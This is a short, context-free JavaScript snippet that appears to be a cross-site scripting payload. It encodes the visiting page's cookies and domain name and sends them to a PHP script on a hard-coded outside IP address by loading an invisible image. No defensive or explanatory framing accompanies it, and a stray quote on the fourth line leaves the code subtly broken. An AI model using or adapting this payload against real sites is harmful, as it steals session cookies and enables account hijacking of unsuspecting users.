var c = encodeURI(document.cookie);
var d = encodeURI(document.domain);
var img = document.createElement("img")
var s = '//198.199.123.13/u.php?c='+c+"&d="+d';
img.setAttribute("src", s);
